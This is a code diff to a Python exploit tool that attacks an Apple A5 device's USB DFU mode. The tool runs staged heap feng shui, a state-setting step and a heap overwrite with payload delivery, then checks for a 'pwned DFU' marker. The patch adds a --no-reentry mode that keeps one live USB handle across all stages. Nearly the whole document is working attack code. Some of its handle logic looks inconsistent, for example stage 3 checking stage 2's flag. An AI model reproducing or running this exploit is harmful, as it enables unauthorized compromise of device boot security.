@@ -594,12 +594,18 @@ def stage1(usb, serial_idx, leak_count, mode, spin_us, leak_delay_ms, debug):
     if leak_delay_ms:
         time.sleep(leak_delay_ms / 1000.0)
     print('  feng shui done (%d attempts)' % attempts)
+    if getattr(stage1, 'keep_handle', False):
+        return handle
     reset_and_release(usb, handle, settle=1.0)
 
 
-def stage2(usb, out_spin_us, padding, debug):
+def stage2(usb, out_spin_us, padding, debug, live_handle=None):
     print('== stage 2: set global state / re-enter DFU ==')
-    dev, handle, desc, _ = acquire(usb, want_serial=False)
+    if live_handle is not None:
+        handle = live_handle
+        print('  (no-reentry: continuing on the live spray handle)')
+    else:
+        dev, handle, desc, _ = acquire(usb, want_serial=False)
     # (d) SETUP(DNLOAD, wLength=0x40) + OUT(0x80) + INHS status.  wLength and
     # the data-stage length are intentionally different.  In --sketch-shape
     # the delivery matches the sketch byte-for-byte: the sketch pushes two
@@ -704,9 +710,14 @@ def stage2(usb, out_spin_us, padding, debug):
     reset_and_release(usb, handle, settle=0.5)
 
 
-def stage3(usb, serial_idx, payload, overwrite, spin_us, debug, crit_us=None):
+def stage3(usb, serial_idx, payload, overwrite, spin_us, debug, crit_us=None,
+          live_handle=None):
     print('== stage 3: heap occupation (overwrite + payload) ==')
-    dev, handle, desc, _ = acquire(usb, want_serial=False)
+    if live_handle is not None:
+        handle = live_handle
+        print('  (no-reentry: continuing on the live armed handle)')
+    else:
+        dev, handle, desc, _ = acquire(usb, want_serial=False)
     # (h) one abandoned IN request ("no leak"), same shape as the Arduino's
     # heap_feng_shui_req(0x81).  Cancelled at the SETUP stage (--spin-us
     # deadline), before any data or status phase: the SETUP is processed and
@@ -766,6 +777,8 @@ def stage3(usb, serial_idx, payload, overwrite, spin_us, debug, crit_us=None):
         rc = usb.ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, payload, 1000)
         if debug:
             print('    [debug] payload OUT        ctrl rc=%d' % rc)
+    if getattr(stage2, 'keep_handle', False):
+        return handle
     reset_and_release(usb, handle, settle=0.5)
 
 
@@ -852,16 +865,22 @@ def exploit(args):
                          'DFU mode). Re-enter DFU from a powered-off state.' % SRTG_A5)
     serial_idx = desc.iSerialNumber
 
+    no_reentry = bool(getattr(args, 'no_reentry', False))
+    stage1.keep_handle = no_reentry
+    stage2.keep_handle = no_reentry
+    live = None
     if args.stage in ('all', '1'):
-        stage1(usb, serial_idx, args.leak, args.feng_shui_mode, args.spin_us,
-               args.leak_delay_ms, args.debug)
+        live = stage1(usb, serial_idx, args.leak, args.feng_shui_mode,
+                      args.spin_us, args.leak_delay_ms, args.debug, )
     if args.stage in ('all', '2'):
-        stage2(usb, args.out_spin_us, args.padding, args.debug)
-    if args.stage in ('all', '3'):
         stage2.sketch_shape = bool(getattr(args, 'sketch_shape', False))
+        live2 = stage2(usb, args.out_spin_us, args.padding, args.debug,
+                       live_handle=live)
+        live = live2 if live is not None else live
+    if args.stage in ('all', '3'):
         stage3.sketch_shape = bool(getattr(args, 'sketch_shape', False))
         stage3(usb, serial_idx, payload, overwrite, args.spin_us, args.debug,
-               crit_us=getattr(args, 'crit_us', None))
+               crit_us=getattr(args, 'crit_us', None), live_handle=live)
     serial = verify(usb)
     if PWN_MARKER not in serial:
         raise SystemExit('error: exploit failed — device did not enter pwned DFU mode.\n'
@@ -1076,6 +1095,10 @@ def main():
     parser.add_argument('--selftest', action='store_true', help='check payload hashes and exit')
     parser.add_argument('--payload', choices=sorted(PAYLOAD_FILES), default='classic',
                         help='prebuilt A5 payload variant (default: classic)')
+    parser.add_argument('--no-reentry', action='store_true', default=False,
+                        help='do not reset or re-acquire between stages: keep '
+                             'talking on the live spray/armed handle (the '
+                             'Arduino never re-enumerates)')
     parser.add_argument('--sketch-shape', action='store_true', default=False,
                         help='emulate the Arduino stage-3 wire exactly: prepend '
                              'the 0xcc pre-packet to the overwrite and payload '
